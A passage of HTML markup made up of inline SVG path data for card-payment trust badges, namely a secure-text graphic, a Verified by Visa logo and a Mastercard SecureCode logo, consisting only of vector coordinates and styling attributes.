66.7295 20.9831 67.1787 20.498C67.6279 20.0098 68.196 19.7656 68.8828 19.7656C69.6543 19.7656 70.263 20.0212 70.709 20.5322C71.1549 21.04 71.3682 21.8197 71.3486 22.8711H67.9111C67.9209 23.278 68.0316 23.5954 68.2432 23.8232C68.4548 24.0479 68.7184 24.1602 69.0342 24.1602C69.249 24.1602 69.4297 24.1016 69.5762 23.9844C69.7227 23.8672 69.8333 23.6784 69.9082 23.418ZM69.9863 22.0312C69.9766 21.6341 69.874 21.333 69.6787 21.1279C69.4834 20.9196 69.2458 20.8154 68.9658 20.8154C68.6663 20.8154 68.4189 20.9245 68.2236 21.1426C68.0283 21.3607 67.9323 21.6569 67.9355 22.0312H69.9863ZM76.9932 21.416L75.6406 21.6602C75.5951 21.39 75.4909 21.1865 75.3281 21.0498C75.1686 20.9131 74.9603 20.8447 74.7031 20.8447C74.3613 20.8447 74.0879 20.9635 73.8828 21.2012C73.681 21.4355 73.5801 21.8294 73.5801 22.3828C73.5801 22.998 73.6826 23.4326 73.8877 23.6865C74.096 23.9404 74.3743 24.0674 74.7227 24.0674C74.9831 24.0674 75.1963 23.9941 75.3623 23.8477C75.5283 23.6979 75.6455 23.4424 75.7139 23.0811L77.0615 23.3105C76.9215 23.929 76.653 24.3962 76.2559 24.7119C75.8587 25.0277 75.3265 25.1855 74.6592 25.1855C73.9007 25.1855 73.2952 24.9463 72.8428 24.4678C72.3936 23.9893 72.1689 23.3268 72.1689 22.4805C72.1689 21.6243 72.3952 20.9587 72.8477 20.4834C73.3001 20.0049 73.9121 19.7656 74.6836 19.7656C75.3151 19.7656 75.8164 19.9023 76.1875 20.1758C76.5618 20.446 76.8304 20.8594 76.9932 21.416ZM80.416 19.8828V20.9766H79.4785V23.0664C79.4785 23.4896 79.4867 23.737 79.5029 23.8086C79.5225 23.877 79.5632 23.9339 79.625 23.9795C79.6901 24.0251 79.7682 24.0479 79.8594 24.0479C79.9863 24.0479 80.1702 24.0039 80.4111 23.916L80.5283 24.9805C80.2093 25.1172 79.848 25.1855 79.4443 25.1855C79.1969 25.1855 78.974 25.1449 78.7754 25.0635C78.5768 24.9788 78.4303 24.8714 78.3359 24.7412C78.2448 24.6077 78.1813 24.4287 78.1455 24.2041C78.1162 24.0446 78.1016 23.7223 78.1016 23.2373V20.9766H77.4717V19.8828H78.1016V18.8525L79.4785 18.0518V19.8828H80.416ZM81.3682 19.1797V17.9102H82.7402V19.1797H81.3682ZM81.3682 25.0684V19.8828H82.7402V25.0684H81.3682ZM83.834 22.4023C83.834 21.9466 83.9463 21.5055 84.1709 21.0791C84.3955 20.6527 84.7129 20.3271 85.123 20.1025C85.5365 19.8779 85.9971 19.7656 86.5049 19.7656C87.2894 19.7656 87.9323 20.0212 88.4336 20.5322C88.9349 21.04 89.1855 21.6829 89.1855 22.4609C89.1855 23.2454 88.9316 23.8965 88.4238 24.4141C87.9193 24.9284 87.2829 25.1855 86.5146 25.1855C86.0394 25.1855 85.5853 25.0781 85.1523 24.8633C84.7227 24.6484 84.3955 24.3343 84.1709 23.9209C83.9463 23.5042 83.834 22.998 83.834 22.4023ZM85.2402 22.4756C85.2402 22.9899 85.3623 23.3838 85.6064 23.6572C85.8506 23.9307 86.1517 24.0674 86.5098 24.0674C86.8678 24.0674 87.1673 23.9307 87.4082 23.6572C87.6523 23.3838 87.7744 22.9867 87.7744 22.4658C87.7744 21.958 87.6523 21.5674 87.4082 21.2939C87.1673 21.0205 86.8678 20.8838 86.5098 20.8838C86.1517 20.8838 85.8506 21.0205 85.6064 21.2939C85.3623 21.5674 85.2402 21.9613 85.2402 22.4756ZM94.9814 25.0684H93.6094V22.4219C93.6094 21.862 93.5801 21.5007 93.5215 21.3379C93.4629 21.1719 93.3669 21.0433 93.2334 20.9521C93.1032 20.861 92.9453 20.8154 92.7598 20.8154C92.5221 20.8154 92.3089 20.8805 92.1201 21.0107C91.9313 21.141 91.8011 21.3135 91.7295 21.5283C91.6611 21.7432 91.627 22.1403 91.627 22.7197V25.0684H90.2549V19.8828H91.5293V20.6445C91.9818 20.0586 92.5514 19.7656 93.2383 19.7656C93.541 19.7656 93.8177 19.821 94.0684 19.9316C94.319 20.0391 94.5078 20.1774 94.6348 20.3467C94.765 20.516 94.8545 20.708 94.9033 20.9229C94.9554 21.1377 94.9814 21.4453 94.9814 21.8457V25.0684Z"
                            stroke="none" class="svg-secure-text"></path>
                </g>
            </svg>
            <svg id="svg-visa-verified" viewBox="0 0 53 28" style="width: 10%; margin: 20px 10px;">
                <path
                        d="M2.88966 9.29797L0.0859375 0.686523H1.28753L2.63218 4.92072C3.0041 6.09371 3.31881 7.12365 3.54768 8.15359H3.57629C3.80517 7.15226 4.17709 6.0651 4.54901 4.94933L6.00809 0.686523H7.20969L4.11987 9.29797H2.88966Z"
                        fill="#6F7D88"></path>
                <path fill-rule="evenodd" clip-rule="evenodd"
                      d="M9.9276 8.55374C8.81183 8.55374 7.83911 7.92433 7.8105 6.40803L12.1591 6.37942C12.1591 6.33202 12.164 6.2748 12.1698 6.20777C12.1779 6.11296 12.1877 5.99853 12.1877 5.86445C12.1877 4.72008 11.6728 2.94629 9.64151 2.94629C7.83911 2.94629 6.75195 4.43398 6.75195 6.2936C6.75195 8.15321 7.86772 9.41203 9.78456 9.41203C10.7573 9.41203 11.4439 9.21176 11.8444 9.0401L11.6442 8.23904C11.215 8.41069 10.7287 8.55374 9.9276 8.55374ZM9.52707 3.77596C10.8145 3.77596 11.1292 4.89173 11.1006 5.60697H7.8105C7.89633 4.83451 8.38269 3.77596 9.52707 3.77596Z"
                      fill="#6F7D88"></path>
                <path
                        d="M13.0748 5.03547C13.0748 4.32023 13.0748 3.69082 13.0176 3.11863H13.9903L14.0189 4.32023H14.0761C14.3622 3.49056 15.0488 2.97559 15.7927 2.97559C15.9071 2.97559 16.0216 2.97559 16.1074 3.0042V4.06275C15.993 4.03414 15.8785 4.03414 15.7355 4.03414C14.9344 4.03414 14.3908 4.63493 14.2192 5.46461C14.1906 5.60766 14.162 5.80792 14.162 5.97958V9.26967H13.0462V5.03547H13.0748Z"
                        fill="#6F7D88"></path>
                <path fill-rule="evenodd" clip-rule="evenodd"
                      d="M17.337 2.06007C17.7948 2.06007 18.0523 1.74536 18.0523 1.37344C18.0523 0.972907 17.7662 0.658203 17.3656 0.658203C16.9365 0.658203 16.6504 0.972907 16.6504 1.37344C16.6504 1.74536 16.9365 2.06007 17.337 2.06007ZM17.9092 3.11862H16.7934V9.29826H17.9092V3.11862Z"
                      fill="#6F7D88"></path>
                <path
                        d="M19.3973 9.29818V3.97682H18.5391V3.11854H19.3973V2.83244C19.3973 1.97416 19.5976 1.1731 20.1126 0.658127C20.5417 0.257594 21.0853 0.0859375 21.6289 0.0859375C22.0294 0.0859375 22.3727 0.171766 22.6016 0.257594L22.4586 1.11588C22.2869 1.03005 22.058 0.972831 21.7433 0.972831C20.7992 0.972831 20.5417 1.8025 20.5417 2.77523V3.11854H22.0294V3.97682H20.5417V9.29818H19.3973Z"
                        fill="#6F7D88"></path>
                <path fill-rule="evenodd" clip-rule="evenodd"
                      d="M23.6319 2.06007C24.0897 2.06007 24.3758 1.74536 24.3472 1.37344C24.3472 0.972907 24.0897 0.658203 23.6605 0.658203C23.2314 0.658203 22.9453 0.972907 22.9453 1.37344C22.9453 1.74536 23.2314 2.06007 23.6319 2.06007ZM24.2041 3.11862H23.0884V9.29826H24.2041V3.11862Z"
                      fill="#6F7D88"></path>
                <path fill-rule="evenodd" clip-rule="evenodd"
                      d="M28.3241 8.55374C27.2083 8.55374 26.2356 7.92433 26.207 6.40803L30.5556 6.37942C30.5556 6.33202 30.5605 6.2748 30.5663 6.20777C30.5744 6.11296 30.5842 5.99853 30.5842 5.86445C30.5842 4.72008 30.0693 2.94629 28.038 2.94629C26.2356 2.94629 25.1484 4.43398 25.1484 6.2936C25.1484 8.15321 26.2642 9.41203 28.181 9.41203C29.1538 9.41203 29.8404 9.21176 30.2409 9.0401L30.0407 8.23904C29.6115 8.41069 29.1252 8.55374 28.3241 8.55374ZM27.9236 3.77596C29.211 3.77596 29.4971 4.89173 29.4971 5.60697H26.207C26.2928 4.83451 26.7792 3.77596 27.9236 3.77596Z"
                      fill="#6F7D88"></path>
                <path fill-rule="evenodd" clip-rule="evenodd"
                      d="M36.8201 7.69558V0.228516H35.7044V3.89053H35.6757C35.3897 3.40416 34.7602 2.94641 33.8161 2.94641C32.2998 2.94641 31.041 4.20523 31.041 6.26511C31.041 8.15333 32.1854 9.41215 33.6731 9.41215C34.703 9.41215 35.4469 8.89718 35.7902 8.21055H35.8188L35.876 9.29771H36.8773C36.8201 8.86857 36.8201 8.23916 36.8201 7.69558ZM35.6471 5.14934C35.7044 5.29239 35.7044 5.49266 35.7044 5.6357V6.69425C35.7044 6.86591 35.6757 7.03757 35.6471 7.18061C35.4183 8.0389 34.7316 8.52526 33.9878 8.52526C32.7576 8.52526 32.1568 7.49532 32.1568 6.2365C32.1568 4.86325 32.8434 3.83331 34.0164 3.83331C34.8747 3.83331 35.4755 4.43411 35.6471 5.14934Z"
                      fill="#6F7D88"></path>
                <path fill-rule="evenodd" clip-rule="evenodd"
                      d="M41.026 7.69558C41.026 8.23916 40.9974 8.86857 40.9688 9.29771H41.9701L42.0273 8.26777H42.0559C42.5137 9.09745 43.2289 9.44076 44.1158 9.44076C45.489 9.44076 46.8909 8.32499 46.8909 6.12206C46.9195 4.26245 45.8324 2.97502 44.2874 2.97502C43.2861 2.97502 42.5709 3.43277 42.1703 4.1194H42.1417V0.228516H41.026V7.69558ZM42.199 7.20922C42.1703 7.09478 42.1417 6.95174 42.1417 6.80869H42.1703V5.69292C42.1703 5.52126 42.199 5.34961 42.2276 5.23517C42.4564 4.37689 43.1717 3.86192 43.9441 3.86192C45.1457 3.86192 45.7751 4.92047 45.7751 6.15067C45.7751 7.55254 45.0599 8.52526 43.8869 8.52526C43.0572 8.52526 42.4278 7.98168 42.199 7.20922Z"
                      fill="#6F7D88"></path>
                <path
                        d="M48.1208 3.11816L49.4655 6.78017C49.6085 7.18071 49.7516 7.66707 49.866 8.03899H49.8946C50.0091 7.66707 50.1235 7.18071 50.2951 6.75156L51.5254 3.11816H52.727L51.039 7.52402C50.2379 9.64112 49.6944 10.7283 48.9219 11.3863C48.3783 11.8727 47.8347 12.0729 47.5486 12.1015L47.2625 11.1574C47.5486 11.0716 47.9206 10.8999 48.2353 10.6138C48.55 10.385 48.9219 9.92721 49.1794 9.35502C49.2366 9.24059 49.2652 9.15476 49.2652 9.09754C49.2652 9.04032 49.2366 8.95449 49.1794 8.81145L46.8906 3.11816L48.1208 3.11816Z"
                        fill="#6F7D88"></path>
                <path
                        d="M18.74 13.5039L15.3355 22.1154L13.9622 14.7913C13.7906 13.9617 13.1612 13.5039 12.4459 13.5039H6.86708L6.78125 13.8758C7.92563 14.1333 9.21305 14.5338 10.0141 14.963C10.5005 15.2205 10.6435 15.4493 10.7866 16.0788L13.39 26.1779H16.8804L22.2017 13.5039H18.74V13.5039Z"
                        fill="#6F7D88"></path>
                <path d="M23.6027 13.5039L20.8848 26.1779H24.1749L26.8641 13.5039H23.6027Z" fill="#6F7D88"></path>
                <path
                        d="M31.184 17.0223C31.184 16.5645 31.6418 16.0781 32.5859 15.9637C33.0436 15.9065 34.3597 15.8493 35.8188 16.5359L36.3909 13.8466C35.5899 13.5605 34.5886 13.2744 33.3297 13.2744C30.0969 13.2744 27.8081 14.991 27.7795 17.48C27.7509 19.311 29.4102 20.3123 30.6404 20.9131C31.9279 21.5425 32.357 21.9145 32.3284 22.4867C32.3284 23.3449 31.2985 23.7169 30.383 23.7169C28.7236 23.7455 27.7795 23.2591 27.007 22.9158L26.4062 25.6909C27.1787 26.0342 28.5806 26.3489 30.0397 26.3489C33.4728 26.3489 35.7329 24.661 35.7329 22.0003C35.7902 18.7102 31.1554 18.5099 31.184 17.0223Z"
                        fill="#6F7D88"></path>
                <path fill-rule="evenodd" clip-rule="evenodd"
                      d="M40.5107 14.4187C40.7395 13.8751 41.2831 13.5032 41.9125 13.5032V13.4746H44.7163L47.3483 26.1486H44.3157L43.9152 24.2604H39.7096L39.023 26.1486H35.5898L40.5107 14.4187ZM42.3989 16.9364L40.6537 21.6855H43.3716L42.3989 16.9364Z"
                      fill="#6F7D88"></path>
            </svg>
            <svg id="svg-mastercard-secure-code" viewBox="0 0 72 23" style="width: 10%; margin: 20px 10px;">
                <path fill-rule="evenodd" clip-rule="evenodd"
                      d="M67.9287 16.9709C67.6912 16.9709 67.4812 17.0064 67.2965 17.0783C67.1123 17.1511 66.9538 17.2532 66.8201 17.3869C66.6865 17.52 66.5777 17.679 66.4933 17.8632C66.4081 18.047 66.3486 18.2495 66.3153 18.4697H69.472C69.3996 17.9955 69.2313 17.627 68.9641 17.3647C68.6972 17.1023 68.3518 16.9709 67.9287 16.9709ZM67.9545 15.7894C68.3776 15.7894 68.7661 15.8671 69.1195 16.0207C69.4729 16.1761 69.7761 16.3937 70.0278 16.6756C70.28 16.9575 70.4763 17.2941 70.6188 17.6852C70.7604 18.0772 70.831 18.5101 70.831 18.9843C70.831 19.0691 70.8283 19.1539 70.8243 19.2382C70.8208 19.323 70.8137 19.4034 70.8057 19.4793H66.3091C66.3508 19.755 66.4294 19.9899 66.544 20.1843C66.6585 20.3797 66.7957 20.5391 66.9573 20.6643C67.1176 20.789 67.2974 20.8814 67.4967 20.94C67.6956 20.9995 67.9034 21.0292 68.1187 21.0292C68.4242 21.0292 68.7301 20.9737 69.0369 20.8614C69.3441 20.7491 69.6243 20.591 69.8787 20.3881L70.5389 21.3342C70.1659 21.6521 69.7708 21.8746 69.3539 22.0011C68.9374 22.1285 68.4983 22.192 68.0366 22.192C67.5798 22.192 67.1602 22.1152 66.7788 21.9634C66.3979 21.8106 66.0694 21.5949 65.7941 21.3156C65.5193 21.0359 65.3053 20.6989 65.153 20.3056C65.0003 19.9113 64.9243 19.4735 64.9243 18.9909C64.9243 18.5163 64.998 18.0821 65.1463 17.6888C65.2946 17.295 65.5024 16.9575 65.7692 16.6756C66.0361 16.3941 66.3544 16.1761 66.7247 16.0212C67.0958 15.8671 67.5056 15.7894 67.9545 15.7894ZM60.4531 17.0406C60.1649 17.0406 59.9079 17.0925 59.681 17.1959C59.4546 17.2998 59.2632 17.4401 59.1065 17.6151C58.9498 17.7909 58.829 17.9973 58.7442 18.2348C58.6598 18.4719 58.6172 18.7237 58.6172 18.9905C58.6172 19.2569 58.6598 19.5091 58.7442 19.7466C58.829 19.9837 58.9498 20.1901 59.1065 20.3655C59.2628 20.5413 59.4546 20.6807 59.681 20.7855C59.9079 20.8889 60.1649 20.94 60.4531 20.94C60.7279 20.94 60.9774 20.8907 61.2029 20.7908C61.4267 20.6918 61.6194 20.5551 61.7801 20.3815C61.9413 20.2083 62.066 20.0028 62.1548 19.7657C62.2436 19.5286 62.2885 19.2706 62.2885 18.9909C62.2885 18.7117 62.2436 18.4528 62.1548 18.2158C62.066 17.9787 61.9413 17.774 61.7801 17.6C61.6194 17.4264 61.4267 17.2901 61.2029 17.1897C60.9774 17.0907 60.7279 17.0406 60.4531 17.0406ZM60.2941 15.7894C60.7301 15.7894 61.1053 15.8707 61.4178 16.0341C61.7313 16.197 61.9941 16.4141 62.2059 16.6849V12.8867H63.5338V22.0326H62.2059V21.3027C61.9941 21.5731 61.7313 21.7898 61.4178 21.9505C61.1053 22.1112 60.7301 22.1916 60.2941 22.1916C59.8666 22.1916 59.4683 22.1125 59.0998 21.9536C58.7313 21.7942 58.4103 21.5731 58.1346 21.2894C57.8589 21.0061 57.6431 20.6687 57.4864 20.2762C57.3301 19.8847 57.252 19.4562 57.252 18.9905C57.252 18.5248 57.3301 18.0954 57.4864 17.7043C57.6431 17.3132 57.8589 16.9748 58.1346 16.6911C58.4103 16.4074 58.7313 16.1863 59.0998 16.0274C59.4683 15.8689 59.8666 15.7894 60.2941 15.7894ZM53.0218 17.0406C52.7501 17.0406 52.4983 17.0885 52.2657 17.1835C52.0331 17.2785 51.8311 17.4122 51.6623 17.5835C51.4923 17.7549 51.3596 17.9605 51.2619 18.1998C51.1646 18.4395 51.1158 18.7024 51.1158 18.9905C51.1158 19.2782 51.1646 19.5424 51.2619 19.7812C51.3596 20.0205 51.4923 20.2261 51.6623 20.3975C51.8311 20.5688 52.0326 20.7016 52.2657 20.7975C52.4983 20.8925 52.7501 20.94 53.0218 20.94C53.2926 20.94 53.5444 20.8925 53.777 20.7975C54.0092 20.7016 54.2121 20.5688 54.3835 20.3975C54.5553 20.2261 54.6894 20.0205 54.787 19.7812C54.8843 19.5424 54.9331 19.2782 54.9331 18.9905C54.9331 18.7024 54.8843 18.4395 54.787 18.1998C54.6894 17.9605 54.5553 17.7549 54.3835 17.5835C54.2121 17.4122 54.0092 17.2785 53.777 17.1835C53.5444 17.0885 53.2926 17.0406 53.0218 17.0406ZM53.0218 15.7894C53.4915 15.7894 53.9266 15.8707 54.3262 16.0341C54.7271 16.197 55.073 16.4217 55.3647 16.7071C55.6572 16.9926 55.8859 17.3305 56.051 17.7198C56.2162 18.1092 56.2988 18.5336 56.2988 18.9905C56.2988 19.4478 56.2162 19.8713 56.051 20.2603C55.8859 20.6505 55.6572 20.9879 55.3647 21.2739C55.073 21.5593 54.7271 21.784 54.3262 21.9469C53.9266 22.1099 53.4915 22.1916 53.0218 22.1916C52.5512 22.1916 52.1161 22.1099 51.7161 21.9469C51.3156 21.784 50.9711 21.5593 50.6812 21.2739C50.3908 20.9879 50.1635 20.6505 49.9979 20.2603C49.8332 19.8713 49.751 19.4478 49.751 18.9905C49.751 18.5336 49.8332 18.1092 49.9979 17.7198C50.1639 17.3305 50.3908 16.9926 50.6812 16.7071C50.9711 16.4217 51.316 16.197 51.7161 16.0341C52.1165 15.8707 52.5512 15.7894 53.0218 15.7894ZM45.1776 12.9755C45.5714 12.9755 45.9528 13.0177 46.3209 13.1025C46.6894 13.1877 47.0321 13.3098 47.3496 13.471C47.667 13.6322 47.956 13.8279 48.2135 14.0588C48.4719 14.2897 48.6881 14.5485 48.8613 14.8367L47.6617 15.6367C47.3895 15.2385 47.0419 14.9259 46.6161 14.6968C46.1899 14.4686 45.7113 14.3541 45.1776 14.3541C44.7239 14.3541 44.3052 14.4322 43.9198 14.5889C43.5345 14.7456 43.2024 14.9659 42.9227 15.2496C42.6434 15.5333 42.4241 15.8742 42.2656 16.2725C42.1067 16.6703 42.0272 17.1085 42.0272 17.5871C42.0272 18.0657 42.1067 18.5039 42.2656 18.9017C42.4241 19.2999 42.6434 19.6405 42.9227 19.9242C43.2024 20.2083 43.5345 20.4281 43.9198 20.5848C44.3052 20.7415 44.7239 20.8197 45.1776 20.8197C45.7064 20.8197 46.1823 20.7078 46.6032 20.4831C47.025 20.2585 47.3749 19.9459 47.6546 19.5432L48.824 20.401C48.6331 20.6798 48.4102 20.9298 48.1536 21.15C47.8979 21.3702 47.6137 21.5589 47.3021 21.7156C46.9908 21.8719 46.6561 21.9922 46.2987 22.0744C45.9408 22.1574 45.567 22.1982 45.1776 22.1982C44.4961 22.1982 43.8692 22.0832 43.2978 21.8519C42.726 21.6215 42.235 21.3005 41.8243 20.8898C41.4132 20.4787 41.0939 19.9925 40.8649 19.4291C40.6366 18.8657 40.5221 18.2522 40.5221 17.5871C40.5221 16.922 40.6366 16.3084 40.8649 15.7446C41.0939 15.1816 41.4132 14.6946 41.8243 14.2839C42.235 13.8737 42.726 13.5531 43.2978 13.3223C43.8692 13.0909 44.4961 12.9755 45.1776 12.9755ZM36.5459 16.9709C36.3088 16.9709 36.0983 17.0064 35.9141 17.0783C35.7298 17.1511 35.5709 17.2532 35.4372 17.3869C35.3041 17.52 35.1948 17.679 35.1105 17.8632C35.0257 18.047 34.9662 18.2495 34.9329 18.4697H38.09C38.0172 17.9955 37.848 17.627 37.5812 17.3647C37.3144 17.1023 36.9699 16.9709 36.5459 16.9709ZM36.5716 15.7894C36.9952 15.7894 37.3836 15.8671 37.737 16.0207C38.0909 16.1761 38.3932 16.3937 38.6454 16.6756C38.8972 16.9575 39.0938 17.2941 39.2364 17.6852C39.3771 18.0772 39.4486 18.5101 39.4486 18.9843C39.4486 19.0691 39.4464 19.1539 39.4424 19.2382C39.4375 19.323 39.4313 19.4034 39.4233 19.4793H34.9262C34.9684 19.755 35.0466 19.9899 35.1611 20.1843C35.2756 20.3797 35.4133 20.5391 35.574 20.6643C35.7347 20.789 35.9145 20.8814 36.1139 20.94C36.3128 20.9995 36.5205 21.0292 36.7359 21.0292C37.0413 21.0292 37.3472 20.9737 37.654 20.8614C37.9613 20.7491 38.2414 20.591 38.4958 20.3881L39.156 21.3342C38.7835 21.6521 38.3888 21.8746 37.9715 22.0011C37.5546 22.1285 37.1155 22.192 36.6537 22.192C36.1964 22.192 35.7773 22.1152 35.396 21.9634C35.015 21.8106 34.6865 21.5949 34.4117 21.3156C34.136 21.0359 33.9224 20.6989 33.7701 20.3056C33.6174 19.9113 33.5415 19.4735 33.5415 18.9909C33.5415 18.5163 33.6156 18.0821 33.7639 17.6888C33.9118 17.295 34.1191 16.9575 34.3864 16.6756C34.6527 16.3941 34.9715 16.1761 35.3418 16.0212C35.7125 15.8671 36.1223 15.7894 36.5716 15.7894ZM32.1123 15.7894C32.3157 15.7894 32.4986 15.8032 32.6615 15.8307C32.8249 15.8578 32.9825 15.9018 33.1352 15.9608L32.8178 17.2759C32.6779 17.2031 32.5146 17.1484 32.3285 17.1098C32.1421 17.0721 31.968 17.0534 31.8077 17.0534C31.596 17.0534 31.4015 17.0894 31.2235 17.1613C31.0454 17.2332 30.8927 17.3389 30.7662 17.4792C30.6388 17.6186 30.5393 17.79 30.4674 17.9929C30.395 18.1967 30.3595 18.4271 30.3595 18.6855V22.0326H29.032V15.9484H30.3466V16.6339C30.55 16.3417 30.8017 16.1282 31.1023 15.9928C31.4033 15.8569 31.7398 15.7894 32.1123 15.7894ZM27.2663 19.4545C27.2663 19.9366 27.186 20.3517 27.0252 20.6985C26.8641 21.0461 26.6523 21.3298 26.3899 21.55C26.1275 21.7707 25.827 21.9323 25.4882 22.0357C25.1494 22.1401 24.8018 22.1916 24.4462 22.1916C24.0906 22.1916 23.7438 22.1401 23.4046 22.0357C23.0659 21.9323 22.7644 21.7707 22.4994 21.55C22.2347 21.3298 22.0234 21.0461 21.8645 20.6985C21.7055 20.3517 21.6261 19.9366 21.6261 19.4545V15.9484H22.9598V19.3332C22.9598 19.6254 22.9984 19.8749 23.0743 20.0796C23.1507 20.2851 23.2554 20.4512 23.3886 20.5786C23.5223 20.7051 23.6799 20.7975 23.8619 20.8543C24.0439 20.9116 24.2389 20.94 24.4462 20.94C24.6535 20.94 24.8484 20.9116 25.0309 20.8543C25.2129 20.7975 25.3705 20.7051 25.5037 20.5786C25.6374 20.4512 25.7422 20.2851 25.8181 20.0796C25.8944 19.8749 25.9326 19.6254 25.9326 19.3332V15.9484H27.2663V19.4545ZM18.1844 15.7894C18.6416 15.7894 19.067 15.8707 19.4608 16.0341C19.8546 16.197 20.1871 16.4394 20.4584 16.7609L19.6069 17.6688C19.3911 17.4659 19.1664 17.3105 18.9338 17.2022C18.7007 17.0943 18.4383 17.0406 18.1462 17.0406C17.8918 17.0406 17.6547 17.0885 17.4349 17.1835C17.2143 17.2785 17.0238 17.4122 16.8631 17.5835C16.7019 17.7549 16.5758 17.9605 16.4848 18.1998C16.3942 18.4395 16.3485 18.7024 16.3485 18.9905C16.3485 19.2782 16.3942 19.5424 16.4848 19.7812C16.5758 20.0205 16.7019 20.2261 16.8631 20.3975C17.0238 20.5688 17.2143 20.7016 17.4349 20.7975C17.6547 20.8925 17.8918 20.94 18.1462 20.94C18.4383 20.94 18.7114 20.8801 18.9653 20.7593C19.2197 20.639 19.4439 20.4871 19.6384 20.3051L20.4584 21.2197C20.1787 21.5411 19.8439 21.784 19.4546 21.9469C19.0648 22.1099 18.6416 22.1916 18.1844 22.1916C17.7013 22.1916 17.2631 22.1099 16.8693 21.9469C16.4759 21.784 16.139 21.5593 15.8597 21.2739C15.58 20.9879 15.3642 20.6505 15.2119 20.2603C15.0592 19.8713 14.9828 19.4478 14.9828 18.9905C14.9828 18.5336 15.0592 18.1092 15.2119 17.7198C15.3642 17.3305 15.58 16.9926 15.8597 16.7071C16.139 16.4217 16.4755 16.197 16.8693 16.0341C17.2631 15.8707 17.7013 15.7894 18.1844 15.7894ZM11.1278 16.9709C10.8907 16.9709 10.6803 17.0064 10.496 17.0783C10.3118 17.1511 10.1528 17.2532 10.0196 17.3869C9.88645 17.52 9.77723 17.679 9.69243 17.8632C9.60763 18.047 9.54858 18.2495 9.51484 18.4697H12.6711C12.5991 17.9955 12.43 17.627 12.1632 17.3647C11.8963 17.1023 11.5514 16.9709 11.1278 16.9709ZM11.1536 15.7894C11.5767 15.7894 11.9651 15.8671 12.319 16.0207C12.6724 16.1761 12.9747 16.3937 13.2269 16.6756C13.4787 16.9575 13.6758 17.2941 13.8179 17.6852C13.959 18.0772 14.0305 18.5101 14.0305 18.9843C14.0305 19.0691 14.0283 19.1539 14.0239 19.2382C14.0194 19.323 14.0132 19.4034 14.0048 19.4793H9.50818C9.55036 19.755 9.62894 19.9899 9.74305 20.1843C9.85715 20.3797 9.99522 20.5391 10.1559 20.6643C10.3171 20.789 10.4969 20.8814 10.6963 20.94C10.8947 20.9995 11.1021 21.0292 11.3183 21.0292C11.6233 21.0292 11.9287 20.9737 12.236 20.8614C12.5432 20.7491 12.8238 20.591 13.0777 20.3881L13.7379 21.3342C13.3659 21.6521 12.9707 21.8746 12.5539 22.0011C12.1365 22.1285 11.6974 22.192 11.2357 22.192C10.7784 22.192 10.3593 22.1152 9.97835 21.9634C9.59742 21.8106 9.26888 21.5949 8.99362 21.3156C8.71835 21.0359 8.50435 20.6989 8.35251 20.3056C8.19979 19.9113 8.12342 19.4735 8.12342 18.9909C8.12342 18.5163 8.19757 18.0821 8.34585 17.6888C8.49414 17.295 8.70148 16.9575 8.96831 16.6756C9.23514 16.3941 9.55347 16.1761 9.92419 16.0212C10.2949 15.8671 10.7043 15.7894 11.1536 15.7894ZM6.30712 15.1097C5.92619 14.8686 5.52794 14.6813 5.11327 14.5472C4.69815 14.414 4.26439 14.3478 3.81109 14.3478C3.51496 14.3478 3.24369 14.3785 2.99817 14.4397C2.75265 14.501 2.54176 14.5898 2.36595 14.7066C2.19058 14.8233 2.05383 14.9627 1.9566 15.1257C1.85937 15.2886 1.81053 15.472 1.81053 15.6749C1.81053 15.8614 1.85271 16.0199 1.93751 16.1513C2.02231 16.2827 2.14396 16.3937 2.3029 16.4847C2.4614 16.5757 2.65542 16.6507 2.88407 16.7102C3.11271 16.7697 3.37066 16.8203 3.6588 16.863L4.2746 16.9451C4.63466 16.9962 4.98629 17.0743 5.32904 17.1809C5.67179 17.2861 5.97769 17.4344 6.24674 17.6253C6.51579 17.8148 6.732 18.055 6.8945 18.3427C7.05788 18.6304 7.13957 18.9798 7.13957 19.3905C7.13957 19.8438 7.04412 20.2438 6.85365 20.591C6.66274 20.9382 6.40435 21.2304 6.07847 21.467C5.75215 21.7045 5.37433 21.8848 4.945 22.0078C4.51479 22.1303 4.05883 22.1916 3.57622 22.1916C3.27521 22.1916 2.96309 22.1663 2.63944 22.1148C2.31533 22.0646 1.99567 21.9896 1.68 21.8901C1.36478 21.7898 1.06288 21.6663 0.774738 21.5185C0.487041 21.3702 0.228647 21.1966 0 20.9968L0.781397 19.854C0.934125 19.9939 1.11704 20.1235 1.33104 20.2416C1.54459 20.3606 1.77413 20.4641 2.01965 20.5528C2.26561 20.6416 2.52045 20.7109 2.78506 20.7593C3.04967 20.8081 3.31161 20.8326 3.56956 20.8326C3.8617 20.8326 4.13386 20.8032 4.38559 20.7438C4.63777 20.6843 4.85665 20.5972 5.04312 20.4831C5.22915 20.3686 5.37654 20.2301 5.48443 20.0671C5.59276 19.9042 5.64648 19.7208 5.64648 19.5179C5.64648 19.1703 5.476 18.9057 5.13547 18.7237C4.79405 18.5416 4.29813 18.4058 3.64593 18.317L2.95377 18.222C2.62301 18.1754 2.30024 18.0994 1.98502 17.9933C1.66979 17.8881 1.38787 17.7385 1.14013 17.5458C0.892391 17.3531 0.69349 17.112 0.543426 16.8217C0.392474 16.5322 0.317443 16.1797 0.317443 15.7646C0.317443 15.3197 0.40979 14.925 0.594039 14.5796C0.777845 14.2351 1.02869 13.9447 1.34658 13.7094C1.66402 13.4741 2.03563 13.2956 2.46096 13.1731C2.88673 13.0501 3.34047 12.9884 3.82352 12.9884C4.47172 12.9884 5.05688 13.0745 5.57944 13.2459C6.10245 13.4173 6.5886 13.6512 7.0379 13.9474L6.30712 15.1097Z"
                      fill="#6F7D88"></path>
                <path fill-rule="evenodd" clip-rule="evenodd"
